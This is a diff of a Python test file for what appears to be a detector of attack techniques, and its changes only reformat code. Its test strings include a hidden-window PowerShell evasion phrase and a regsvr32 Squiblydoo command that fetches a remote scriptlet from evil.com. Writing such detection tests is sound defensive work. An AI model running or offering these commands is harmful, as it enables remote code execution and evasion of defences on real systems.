@@ -456,7 +456,10 @@ def test_noprofile_without_powershell_keyword_captured():
     text = "The script was invoked with -NoProfile -WindowStyle Hidden to avoid detection."
     result = process(text)
     assert len(result["high_likelihood_snippets"]) >= 1
-    assert "-NoProfile" in result["high_likelihood_snippets"][0] or "-noprofile" in result["high_likelihood_snippets"][0].lower()
+    assert (
+        "-NoProfile" in result["high_likelihood_snippets"][0]
+        or "-noprofile" in result["high_likelihood_snippets"][0].lower()
+    )
 
 
 def test_executionpolicy_flag_captured():
@@ -597,7 +600,9 @@ def test_tasklist_no_match():
 
 def test_regsvr32_captured():
     """regsvr32 (T1218.010 Squiblydoo) surfaces a snippet."""
-    text = "The actor registered a malicious COM object using regsvr32 /s /n /u /i:http://evil.com/payload.sct scrobj.dll"
+    text = (
+        "The actor registered a malicious COM object using regsvr32 /s /n /u /i:http://evil.com/payload.sct scrobj.dll"
+    )
     result = process(text)
     assert len(result["high_likelihood_snippets"]) >= 1
     assert "regsvr32" in result["high_likelihood_snippets"][0].lower()
